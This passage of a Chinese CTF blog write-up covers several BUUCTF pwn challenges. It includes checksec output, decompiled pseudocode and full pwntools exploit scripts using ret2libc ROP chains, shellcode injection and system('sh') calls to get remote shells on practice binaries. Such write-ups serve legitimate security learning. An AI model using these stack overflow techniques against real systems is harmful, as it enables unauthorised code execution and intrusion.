class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28335</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./ciscn_2019_n_5&quot;)</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400713</span></span><br><span class="line"><span class="comment"># 64 位程序，参数传入寄存器中</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line">puts_plt = <span class="number">0x4004E0</span></span><br><span class="line">back_addr = <span class="number">0x400636</span></span><br><span class="line"><span class="comment"># 之后返回至主函数再次利用栈溢出来调用危险套装</span></span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;h-t-m&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">32</span> + <span class="number">8</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(back_addr)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = <span class="built_in">hex</span>(u64(io.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>)))</span><br><span class="line"><span class="comment"># 取出真实地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,<span class="built_in">int</span>(puts_addr,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">base = <span class="built_in">int</span>(puts_addr,<span class="number">16</span>) - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">ret = <span class="number">0x4004c9</span></span><br><span class="line"><span class="comment"># 环境为 Ubuntu 18，因此插入 ret 来平衡栈</span></span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;h-t-m&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">32</span> + <span class="number">8</span>) + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(sys_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ul><h3 id="执行-BBS">执行 BBS</h3><ul><li><kbd>ret2libc</kbd> 虽然足以解题，但是本题显然该有更加丝滑的解法。程序提供了连续的两次输入读取，且含有可写可执行的内存，若第一次输入被保存的地址正好可写可读的话，那就可以在第一次输入 <kbd>shellcode</kbd>，而第二次利用栈溢出调用该地址的 <kbd>shellcode</kbd>。这样构造出来的 <kbd>exp</kbd> 也十分简单，<kbd>shellcode</kbd> 直接使用工具生成即可，值得注意的是，由于 <kbd>pwntools</kbd> 的默认架构是 <kbd>i386</kbd>，所以此前的 <kbd>32</kbd> 位平台可以直接生成 <kbd>shellcode</kbd> 来使用，而现在靶机环境为 <kbd>64</kbd> 位，因此需要将 <kbd>context</kbd> 模块的 <kbd>arch</kbd> 变量值设为 <kbd>amd64</kbd>。构造 <kbd>exp</kbd> 如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./ciscn_2019_n_5&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26571</span>)</span><br><span class="line"></span><br><span class="line">name_addr = <span class="number">0x0601080</span></span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh()) </span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(name_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li><li><p>上述 <kbd>exp</kbd> 可以成功拿到 Shell，也说明了全局变量 <kbd>name</kbd> 所在的 <kbd>.bss</kbd> 段具有可执行权限，但事实上，在本地分析文件查看各段权限时会发现这些数据段都没有执行权限，NX 保护的开关所影响的只有栈内存的执行权限。</p><img src="0003.webp" alt="" style="zoom:75%"><p>查阅了各种资料后发现实际的内存权限并不严格按照可执行文件中相应段属性来分配，其还需要依赖内存管理单元的行为，在一般情况下，内存管理单位会认为读取与执行权限是同级的，而写权限为更高级的权限，因此会出现拥有可读权限便拥有执行权限，而拥有写权限则拥有全部权限的情况。因此本题的文件在实际执行时各段的权限便会如下图所示，变量 <kbd>name</kbd> 所在的位置就变成了实际可执行的内存空间。</p><img src="0004.webp" alt="" style="zoom:75%"><p>当然，在 NX 保护开启的情况下，所有的数据所在的内存页都会被标识为不可执行，因此不会存在实际执行时又获取执行权限的情况。</p></li><li><p>经过测试，在 Ubuntu 20 以后版本中，未开启 NX 保护的程序在实际运行时并不会获得执行权限，所以题给文件在这些环境下将无法通过 <kbd>ret2shellcode</kbd> 完成。在进一步的测试中，笔者也发现这并不是 Ubuntu 系统所作的更新，而是位于 Linux 内核上的更新，实测在长期支持版 <kbd>5.10</kbd> 及之后的 Linux 内核均作了此修改。<psw>至于该修改是否起源于哪个非长期支持版以及具体修改的代码内容，下次再来探索吧。</psw></p><img src="0005.webp" alt="" style="zoom:75%"></li></ul><h2 id="others-shellcode">others_shellcode</h2><ul><li><p>先验文件，本题文件为 <kbd>32</kbd> 位可执行文件，NX 保护照常开启，除此之外还开启了 PIE 保护。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ file shell_asm     </span><br><span class="line">shell_asm: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=c1e8d8e26946c6b08794abdad991e3909e1bdc7f, not stripped</span><br><span class="line"></span><br><span class="line">└─$ checksec shell_asm     </span><br><span class="line">[*] <span class="string">&#x27;/home/h-t-m/shell_asm&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>本地执行一遍，发现直接获得了一个 Shell？</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./shell_asm</span><br><span class="line">$ h-t-m</span><br><span class="line">/bin//sh: 1: h-t-m: not found</span><br><span class="line">$ </span><br></pre></td></tr></table></figure></li><li><p>那就直接构造如下 <kbd>exp</kbd> 跟靶机交互一下就可以拿到 <kbd>flag</kbd> 了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28426</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li><li><p>这样的题目有点巴适就是说，浅看一下本题的源码，此前我们获取 Shell 基本是调用的，而本题则是通过系统调用 <kbd>execve</kbd> 函数来获取（在 <kbd>eax</kbd> 寄存器中存入系统调用号后通过 <kbd>int 80h</kbd> 中断进入内核，依照 <kbd>eax</kbd> 的系统调用号来完成指定调用）。值得一提的是，该函数也可用于绕开一些 <kbd>64</kbd> 位环境下调用 <kbd>system()</kbd> 函数时的栈对齐问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">call    __x86_get_pc_thunk_ax</span><br><span class="line">add     eax, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">xor     edx, edx        ; envp</span><br><span class="line">push    edx</span><br><span class="line">push    68732F2Fh</span><br><span class="line">push    6E69622Fh</span><br><span class="line">mov     ebx, esp        ; file</span><br><span class="line">push    edx</span><br><span class="line">push    ebx</span><br><span class="line">mov     ecx, esp        ; argv</span><br><span class="line">mov     eax, 0FFFFFFFFh</span><br><span class="line">sub     eax, 0FFFFFFF4h</span><br><span class="line">; 计算结果为 execve 函数的系统调用号</span><br><span class="line">int     80h             ; LINUX - sys_execve</span><br><span class="line">nop</span><br><span class="line">pop     ebp</span><br><span class="line">retn</span><br></pre></td></tr></table></figure></li></ul><h2 id="ciscn-2019-ne-5">ciscn_2019_ne_5</h2><ul><li><p>先验文件，本题文件为 <kbd>32</kbd> 位可执行文件，照惯例开启了 NX 保护。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ file ciscn_2019_ne_5 </span><br><span class="line">ciscn_2019_ne_5: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=6482843cea0a0b348169075298025f13ef6c6ec2, not stripped</span><br><span class="line"></span><br><span class="line">└─$ checksec ciscn_2019_ne_5 </span><br><span class="line">[*] <span class="string">&#x27;/home/h-t-m/ciscn_2019_ne_5&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>本地执行一遍，程序需要输入管理员密码，输入错误则程序中断。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./ciscn_2019_ne_5</span><br><span class="line">Welcome to use LFS.</span><br><span class="line">Please input admin password:h-t-m</span><br><span class="line">Password Error!</span><br></pre></td></tr></table></figure></li><li><kbd>IDA</kbd> 反编译查看伪代码，主函数如下。所以一开始需要输入的密码为 <kbd>administrator</kbd>，密码正确之后便会列出四个选项供选择，分别调用了 <kbd>AddLog()</kbd>、<kbd>Display()</kbd>、<kbd>Print()</kbd> 以及程序终止的 <kbd>exit()</kbd> 函数，程序中的函数实现笔者放在了注释里。值得注意的是 <kbd>Print()</kbd> 函数打印字符串使用的是 <kbd>system()</kbd> 函数。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+0h] [ebp-100h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> src[<span class="number">4</span>]; <span class="comment">// [esp+4h] [ebp-FCh] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">124</span>]; <span class="comment">// [esp+8h] [ebp-F8h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">4</span>]; <span class="comment">// [esp+84h] [ebp-7Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v8[<span class="number">96</span>]; <span class="comment">// [esp+88h] [ebp-78h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> *p_argc; <span class="comment">// [esp+F4h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  *(_DWORD *)s1 = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="keyword">sizeof</span>(v8));</span><br><span class="line">  *(_DWORD *)src = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="keyword">sizeof</span>(v6));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to use LFS.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input admin password:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%100s&quot;</span>, s1);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;administrator&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Password Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your operation:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Add a log.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Display all logs.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Print all logs.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0.Exit\n:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">switch</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      AddLog(src);</span><br><span class="line">      <span class="comment">// 读取用户输入并存入 src，限制输入 128 个字符</span></span><br><span class="line">      <span class="comment">// int __cdecl AddLog(int a1)</span></span><br><span class="line">      <span class="comment">// &#123;</span></span><br><span class="line">      <span class="comment">//     printf(&quot;Please input new log info:&quot;);</span></span><br><span class="line">      <span class="comment">//     return __isoc99_scanf(&quot;%128s&quot;, a1);</span></span><br><span class="line">      <span class="comment">// &#125;</span></span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="comment">// 相应函数调用完毕后返回菜单以供继续选择</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      Display(src);</span><br><span class="line">      <span class="comment">// 调用 puts() 输出 src</span></span><br><span class="line">      <span class="comment">// int __cdecl Display(char *s)</span></span><br><span class="line">      <span class="comment">// &#123;</span></span><br><span class="line">      <span class="comment">// 	return puts(s);</span></span><br><span class="line">      <span class="comment">// &#125;</span></span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      Print();</span><br><span class="line">      <span class="comment">// 调用 system() 函数打印一串字符</span></span><br><span class="line">      <span class="comment">// int Print()</span></span><br><span class="line">      <span class="comment">// &#123;</span></span><br><span class="line">      <span class="comment">// 	return system(&quot;echo Printing......&quot;);</span></span><br><span class="line">      <span class="comment">// &#125;</span></span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      GetFlag(src);</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此外，若用户选择了未列出的选项 <kbd>4</kbd> 则会调用隐藏的函数 <kbd>GetFlag()</kbd>。这函数名字就很引人注意。该函数使用 <kbd>strcpy()</kbd> 直接将变量 <kbd>src</kbd> 的值填入了变量 <kbd>dest</kbd> 中，而变量 <kbd>src</kbd> 则是在 <kbd>AddLog()</kbd> 函数中由用户输入的最高可达 <kbd>128</kbd> 字节的字符串，远超变量 <kbd>dest</kbd> 到栈底的空间，因此该处存在栈溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">GetFlag</span><span class="params">(<span class="keyword">char</span> *src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">60</span>]; <span class="comment">// [esp+4h] [ebp-44h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_DWORD *)dest = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;The flag is your log:%s\n&quot;</span>, dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>存在栈溢出，也存在现成的 <kbd>system()</kbd> 函数，现在只需拿到字符串 <kbd>/bin/sh</kbd> 就可以获取 Shell 了，但是在 <kbd>IDA</kbd> 中 <kbd>Shift</kbd> + <kbd>F12</kbd> 却并没有找到 <kbd>/bin/sh</kbd>。不过，由于 Linux 环境变量默认包含了 <kbd>/bin</kbd> 目录，因此要是有 <kbd>sh</kbd> 也是可以获取 Shell 的，所幸程序中包含字符串 <kbd>fflush</kbd>，我们截取最后两个字符即可，即地址为 <kbd>0x80482EA</kbd></p><img src="0006.webp" alt="" style="zoom:75%"><p>这里也可以直接使用 <kbd>ROPgadget</kbd> 工具来获取，更加丝滑一些，命令如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./ciscn_2019_ne_5 --string <span class="string">&#x27;sh&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>然后就可以直接构造 <kbd>exp</kbd> 了，值得注意的是调用 <kbd>system()</kbd> 函数应使用其 <kbd>PLT</kbd> 地址，避免 <kbd>call</kbd> 指令对栈操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25096</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = <span class="number">0x80484D0</span></span><br><span class="line">sh_addr = <span class="number">0x80482EA</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x48</span> + <span class="number">4</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line">												<span class="comment"># 0xdeadbeef 一个有意思的十六进制魔数</span></span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;administrator&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ul><h2 id="铁人三项-第五赛区-2018-rop">铁人三项(第五赛区)_2018_rop</h2><ul><li><p>先验文件，本题文件为 <kbd>32</kbd> 位可执行文件，依然照惯例开启了 NX 保护。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ file ./2018_rop       </span><br><span class="line">./2018_rop: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=a6c3ab368d8cd315e3bb2b970556ed0510bca094, not stripped</span><br><span class="line"></span><br><span class="line">└─$ checksec ./2018_rop       </span><br><span class="line">[*] <span class="string">&#x27;/home/h-t-m/2018_rop&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>本地执行一遍，程序直接进入等待用户输入状态，输入完毕则打印 <kbd>Hello, World</kbd> 并退出。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./2018_rop</span><br><span class="line">h-t-m myr520</span><br><span class="line">Hello, World</span><br></pre></td></tr></table></figure></li><li><kbd>IDA</kbd> 反编译查看伪代码，主函数仅进行了调用三个函数的操作。其中 <kbd>vulnerable_function()</kbd> 函数负责读取用户输入并保存至局部变量 <kbd>buf</kbd> 中，限制输入字符数为 <kbd>0x100</kbd>，而对应变量距离栈底偏移为 <kbd>0x88</kbd>，因此此处存在栈溢出。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  be_nice_to_people();</span><br><span class="line">  <span class="comment">// 该函数用于设置权限信息，与解题无关</span></span><br><span class="line">  <span class="comment">// int be_nice_to_people()</span></span><br><span class="line">  <span class="comment">// &#123;</span></span><br><span class="line">  <span class="comment">// 	__gid_t v1; // [esp+1Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// 	v1 = getegid();</span></span><br><span class="line">  <span class="comment">// 	return setresgid(v1, v1, v1);</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line">  vulnerable_function();</span><br><span class="line">  <span class="comment">// 读取用户输入</span></span><br><span class="line">  <span class="comment">// ssize_t vulnerable_function()</span></span><br><span class="line">  <span class="comment">// &#123;</span></span><br><span class="line">  <span class="comment">// 	char buf[136]; // [esp+10h] [ebp-88h] BYREF</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// 	return read(0, buf, 0x100u);</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">0xD</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>由于在程序中并未找到可用于获得 Shell 的危险套装，因此本题还是得 <kbd>ret2libc</kbd>，这里让 <kbd>write()</kbd> 函数输出已经被调用过的 <kbd>read()</kbd> 函数的真实地址。当然也可输出 <kbd>write()</kbd> 函数自身的真实地址，虽然此前其并未被程序调用，但是我们的输出操作一开始便调用了他，因此对应 <kbd>GOT</kbd> 表中为真实地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span 